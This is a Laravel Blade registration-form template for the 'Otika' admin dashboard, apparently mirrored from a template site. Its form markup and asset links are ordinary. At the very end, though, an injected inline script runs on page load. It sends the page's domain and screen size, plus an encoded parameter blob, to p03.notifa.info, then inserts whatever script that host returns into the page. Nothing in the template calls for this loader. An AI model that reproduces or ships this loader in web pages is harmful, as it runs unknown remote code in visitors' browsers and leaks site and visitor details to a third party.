

<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.radixtouch.in/templates/admin/otika/source/light/auth-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Mar 2020 12:28:45 GMT -->
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
    <title>Otika - Admin Dashboard Template</title>
    <!-- General CSS Files -->
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/app.min.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-manager/bundles/jquery-selectric/selectric.css') }}">
    <!-- Template CSS -->
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/style.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/components.css') }}">
    <!-- Custom style CSS -->
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/custom.css') }}">
    <link rel='shortcut icon' type='image/x-icon' href='{{ asset ('assets-manager/img/favicon.ico') }}'/>
</head>

<body>
<div id="app">
    <section class="section">
        <div class="container mt-5">
            <div class="row">
                <div class="col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-8 offset-lg-2 col-xl-8 offset-xl-2">
                    <div class="card card-primary">
                        <div class="card-header">
                            <h4>Register</h4>
                        </div>
                        <div class="card-body">
                            <form method="POST" action="{{ route('manager.register.submit') }}">
                                @csrf
                                <div class="form-group">

                                    <label for="name">First Name</label>
                                    <input type="text" class="form-control @error('name') is-invalid @enderror"
                                           name="name" value="{{ old('name') }}" autofocus>
                                    @error('name')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                </div>
                                <div class="form-group">
                                    <label for="email">Email</label>
                                    <input id="email" type="email"
                                           class="form-control @error('email') is-invalid @enderror"
                                           name="email">
                                    <div class="invalid-feedback">
                                    </div>
                                </div>

                                    <div class="form-group">
                                        <label for="password" class="d-block">Password</label>
                                        <input type="password"
                                               class="form-control @error('password') is-invalid @enderror"
                                               data-indicator="pwindicator" name="password">
                                        @error('password')
                                        <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                        @enderror
                                        <div id="pwindicator" class="pwindicator">
                                            <div class="bar"></div>
                                            <div class="label"></div>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label for="password2" class="d-block">Password Confirmation</label>
                                        <input type="password" class="form-control"
                                               name="password_confirmation">
                                    </div>


                                <div class="form-group">
                                    <button type="submit" class="btn btn-primary btn-lg btn-block">
                                        Register
                                    </button>
                                </div>
                            </form>
                        </div>
                        <div class="mb-4 text-muted text-center">
                            Already Registered? <a href="auth-login.html">Login</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>
<!-- General JS Scripts -->
<script src="{{ asset ('assets-manager/js/app.min.js') }}"></script>
<!-- JS Libraies -->
<script src="{{ asset ('assets-manager/bundles/jquery-pwstrength/jquery.pwstrength.min.js') }}"></script>
<script src="{{ asset ('assets-manager/bundles/jquery-selectric/jquery.selectric.min.js') }}"></script>
<!-- Page Specific JS File -->
<script src="{{ asset ('assets-manager/js/page/auth-register.js') }}"></script>
<!-- Template JS File -->
<script src="{{ asset ('assets-manager/js/scripts.js') }}"></script>
<!-- Custom JS File -->
<script src="{{ asset ('assets-manager/js/custom.js') }}"></script>
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXQLX5RO%2br8u9tFQdg7ms6NAd%2fiLmPPG55w1rLBhcJl6CcWLPaw3JAQB5uYc9UA89Y0nOR8hvBCU5kEUWiNePkvgDxhmvmK4CNAkdHmY%2bLBG5f0gzBwybPb0YTUi3fojG5yBDPtdzky1iYybc%2fL2TDmOZmz2ThsB50ZuNIzbyT%2fmdY3mPSd5QvrNq8YYJfeTIqO9fmK%2bVwTkQ2QmZKQe03xCEOL4HktfqtelcBvxxTxJgIMWKd0ZTK9e1Ge0nd%2buDmSrUKwoS%2f4mFE5FnaNkfW3ote2MUUus8h4dnHKacAsqaZSKY%2bolEpyYEbQiobg%2fWkGuW6I1vu%2bHIm69r792cj0HfD1Zbgw5zkywuPhashqlFlVfBGOc56%2f%2f37D2nA9RiOGbPP9kHV8d1GEqAFCNwX0r5AyYITfNYvhYQERehm%2fECsxykP0S6qkX%2buDQmtRxiXtiOQLbGFfT7s298Qb2ShBneF9n0zdID0rQKQZgyADaiFz8GE%2fr8RmbxL%2bJ628y741MI8Vo6NZjvJemOvFfeDCA%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>


<!-- Mirrored from www.radixtouch.in/templates/admin/otika/source/light/auth-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Mar 2020 12:28:45 GMT -->
</html>
